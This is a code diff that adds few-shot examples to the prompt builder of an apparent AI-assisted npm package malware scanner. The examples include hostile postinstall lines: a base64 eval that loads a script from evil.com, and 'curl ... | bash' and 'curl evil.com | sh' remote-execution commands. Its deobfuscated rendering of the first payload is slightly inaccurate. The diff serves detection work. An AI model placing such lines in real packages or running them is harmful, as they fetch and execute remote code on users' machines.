@@ -3,14 +3,51 @@
 import type { AIMode, AIBatchRequest } from '../types/index.js';
 
 /**
+ * Few-shot examples to guide AI analysis
+ */
+function getFewShotExamples(): string {
+  return `## Example Analyses
+
+### Example 1: False Positive (Benign)
+**Package**: express@4.18.2
+**Script**: \`postinstall: node-gyp rebuild\`
+**Regex Finding**: child-process
+**Analysis**: FALSE POSITIVE - Legitimate use of child_process for compiling native addons. Node-gyp is standard build tool for Node.js native modules. The package is well-maintained and widely-used.
+**Verdict**: benign, confidence: 0.95
+
+### Example 2: True Positive (Malicious)
+**Package**: evil-pkg@1.0.0
+**Script**: \`postinstall: eval(atob('ZG9jdW1lbnQuYm9keS5hcHBlbmQoY3JlYXRlRWxlbWVudCgic2NyaXB0Iikuc3JjPSJodHRwOi8vZXZpbC5jb20vIikp'))\`
+**Deobfuscated**: \`eval(document.body.createElement("script").src="http://evil.com/")\`
+**Analysis**: TRUE POSITIVE - Base64-encoded eval that injects remote script tag. Classic XSS/injection attack pattern. The obfuscation (base64 encoding) indicates malicious intent.
+**Verdict**: malicious, confidence: 0.98
+
+### Example 3: Suspicious (Context-Dependent)
+**Package**: unknown-config-lib@0.0.1
+**Script**: \`postinstall: curl -s http://config-server.com/config.sh | bash\`
+**Analysis**: HIGH RISK - Remote script execution. Could be legitimate if config-server.com is well-known and documented. However, unknown package + remote execution = suspicious. Recommend manual review of the downloaded script.
+**Verdict**: suspicious, confidence: 0.70, recommendation: Manual review required
+
+### Example 4: AST-Level Detection
+**Package**: obfuscated-loader@1.0.0
+**Script**: \`postinstall: const m = 'child_process'; require(m).exec('curl evil.com | sh')\`
+**AST Finding**: ast-dynamic-require
+**Analysis**: TRUE POSITIVE - Dynamic require with variable argument bypasses keyword detection. The variable 'm' resolves to 'child_process', a dangerous module. Combined with exec() calling remote script execution, this is clearly malicious.
+**Verdict**: malicious, confidence: 0.92
+
+`;
+}
+
+/**
  * Build the analysis prompt based on mode
  */
 export function buildPrompt(request: AIBatchRequest, mode: AIMode): string {
   const basePrompt = getBasePrompt();
   const modePrompt = getModePrompt(mode);
+  const fewShotExamples = getFewShotExamples();
   const packageData = formatPackageData(request);
 
-  return `${basePrompt}\n\n${modePrompt}\n\n${packageData}\n\n${getOutputInstructions(mode)}`;
+  return `${basePrompt}\n\n${modePrompt}\n\n${fewShotExamples}\n\n${packageData}\n\n${getOutputInstructions(mode)}`;
 }
 
 /**
